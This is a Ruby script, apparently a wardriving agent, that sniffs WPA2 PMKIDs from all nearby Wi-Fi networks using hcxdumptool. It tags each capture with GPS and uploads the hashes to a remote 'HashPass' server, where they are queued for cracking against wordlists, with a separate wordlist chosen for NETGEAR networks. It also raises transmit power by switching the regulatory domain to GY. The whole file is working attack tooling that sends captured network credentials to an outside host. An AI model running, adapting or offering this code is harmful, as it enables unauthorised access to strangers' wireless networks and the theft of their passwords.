#!/usr/bin/env ruby
require 'listen'
require 'rest-client' # https://github.com/rest-client/rest-client
require 'json'
require 'set'
require 'colorize'
require 'dotenv/load'
require 'gpsd_client'

begin
puts <<-'EOF'
 ▄▄▄·  ▄▄ • ▄▄▄ . ▐ ▄ ▄▄▄▄▄      ▄▄▄   ▄▄▄·  ▐ ▄  ▄▄ • ▄▄▄ .
▐█ ▀█ ▐█ ▀ ▪▀▄.▀·•█▌▐█•██  ▪     ▀▄ █·▐█ ▀█ •█▌▐█▐█ ▀ ▪▀▄.▀·
▄█▀▀█ ▄█ ▀█▄▐▀▀▪▄▐█▐▐▌ ▐█.▪ ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ▐█▐▐▌▄█ ▀█▄▐▀▀▪▄
▐█ ▪▐▌▐█▄▪▐█▐█▄▄▌██▐█▌ ▐█▌·▐█▌.▐▌▐█•█▌▐█ ▪▐▌██▐█▌▐█▄▪▐█▐█▄▄▌
 ▀  ▀ ·▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀  ▀█▄▀▪.▀  ▀ ▀  ▀ ▀▀ █▪·▀▀▀▀  ▀▀▀ 

--[ HASHPASS AGENT ]--------

+ WPA2 PMKID Sniffer and REST agent for the HashPass API.

EOF


server = ENV['SERVER']
iface = ENV['INTERFACE']
country = ENV['COUNTRY']
creds = {
  handle: ENV['HANDLE'],
  password: ENV['PASSWORD']
}

wlan = `ls -1 /sys/class/net | grep ^#{ iface }`
timestamp = DateTime.now.to_json
content_type = { content_type: :json, accept: :json }

puts "Logging in as #{ creds[:handle] }..."
begin
  token = JSON.parse(RestClient.post(server + '/hplogin', creds.to_json, { content_type: :json, accept: :json }))['token']
  auth = { :Authorization => "Bearer #{token}" }
rescue Errno::ECONNREFUSED, Net::ReadTimeout => e
  puts "Timeout (#{e}), retrying in 5 seconds..."
  sleep 5
  retry
rescue RestClient::ExceptionWithResponse => e  
  puts 'Error Logging in.'.red
  p e.response
rescue RestClient::Unauthorized, RestClient::Forbidden => e
  puts 'Access denied'.red
  p e.response
rescue => e
  puts 'Error logging in'.red
  p e
 end

if wlan && token
  `gpsd /dev/ttyUSB0 -F /var/run/gpsd.sock`
  puts "Waiting for GPS..."
  sleep 3
  # sleep 10
  gpsd = GpsdClient::Gpsd.new()
  gpsd.start()
  if !gpsd.started?
	  puts "Waiting for GPS....."
	  sleep 130
	  gpsd = GpsdClient::Gpsd.new()
	  gpsd.start()
  end


  `ip link set #{ iface } down`
  if country == 'GY'
    puts 'WARNING: Setting country code to GY and txpower 30. You must be in be in a country that meets these regulations.'.yellow
    `iw reg set GY`
    `iwconfig #{ iface } txpower 30`
  end
  puts "putting #{ iface } into monitor mode...".light_blue
  `iw dev #{ iface } set type monitor`  
  `ip link set #{ iface } up`  
  puts 'cleaning up logs...'.light_cyan
  `rm -r logs/*`
  `rm -r pcapng/*`
  `rm -r pmkid/*`
  puts 'starting capture...'.light_green
  dump_cmd = "hcxdumptool -i #{ iface } -o pcapng/#{ timestamp }.pcapng -t 5 --enable_status >> logs/#{ timestamp }.log 2>&1"
  IO.popen(dump_cmd, 'w')

  # Send PMKID to HashPass once found
  puts 'Starting HashPass API listener...'.light_green
  seen = Set.new([])
  listener = Listen.to('pmkid') do |modified, added, removed|
    unless modified.empty?
      hashes = Set.new(`cat #{ modified[0] }`.split("\n"))
      if seen != hashes
        difference = hashes - seen
        seen = hashes                
        difference.each do |h|
          ssid = h.split("*")[3].gsub(/../) { |pair| pair.hex.chr }
          puts "\nFound new SSID!".red + "   💀   " + " #{ ssid }".light_cyan          
          new_hash = {
            name: ssid,
            hash: '',
            latitude: 32.831921,
            longitude: -117.112375,
            hashmode: '16800',
            hashstring: h
          }
          if gpsd.started?
            pos = gpsd.get_position 
	    last_lat = pos[:lat] unless pos[:lat].nil?
	    last_lon = pos[:lon] unless pos[:lon].nil?
			
	    new_hash[:latitude] = pos[:lat].nil? ? pos[:lat] : last_lat
	    new_hash[:longitude] = pos[:lon].nil? ? pos[:lon] : last_lon
            puts "We have GPS! lat: #{ pos[:lat] }, lon: #{ pos[:lon] }"
          end
          begin
            hash_res = RestClient.post(server + '/api/hashes/insert', new_hash.to_json, auth.merge({ content_type: :json, accept: :json }))
          rescue => e
            puts "Error: #{e}"
          end  
          queue_item = {
            dictionary: '/media/root/6TB/wordlists/rockyou.txt',
            dictionary2: '',
            hashid: hash_res.body.to_i
          }.merge!(new_hash)

          # Detect SSID type and adjust params for a targeted attack
          queue_item[:dictionary] = '/media/root/6TB/wordlists/WoNDeR.txt' if ssid =~ /NETGEAR/
          # queue_item[:dictionary] = '/media/root/6TB/wordlists/nvg599.txt' if ssid =~ /ATT/
          
          if hash_res.code == 201
            puts "#{ queue_item[:name] } already exists in HashPass database.".yellow
          else
            puts "Sending for CRACKING! #{queue_item[:name]} 🚀".light_green
            begin
              res = RestClient.post(server + '/api/pending', queue_item.to_json, auth)
            rescue Errno::ECONNREFUSED, Net::ReadTimeout => e
              puts "Timeout (#{e}), retrying in 5 seconds..."
              sleep 5
              retry
            rescue RestClient::ExceptionWithResponse => e  
              puts "Error Logging in: #{ e.response }".red
            rescue RestClient::Unauthorized, RestClient::Forbidden => e
              puts "Access denied: #{ e.response }".red
            rescue => e
              puts "Error logging in: #{ e.response }".red
             end
          end
        end
      end
    end
  end
  listener.start
else
  puts 'Error: Unable to start agent.'.red
  exit
end

# Look for PMKIDs
cnt = 0
loop do
  $stdout.flush
  tail = `tail -n 7 logs/#{ timestamp }.log`
  if tail.length > 1
    line = tail.split("\n")
    print "hcxpcaptool[#{ cnt }]: ".red + line[0].split("[").last + "\n" #.delete("]") + "\n"
    found = line.grep(/FOUND PMKID/)[0]
  end
  if found
    `rm pmkid/#{ timestamp }.16800` unless seen.empty?
    `hcxpcaptool -z pmkid/#{ timestamp }.16800 pcapng/#{ timestamp }.pcapng`
    found = nil
    cnt = 0
  end
  cnt += 1

  if cnt > 30
    puts "RESTARTING!!!".yellow
    `killall hcxdumptool`    
    sleep 3
    exec './agent-orange.rb'
    sleep 3
    exit
  end

  # Loop forever
  sleep 1
end

at_exit { p `killall hcxdumptool` }

rescue Exception => e
  puts "Exception #{ e }"
  `killall hcxdumptool`
end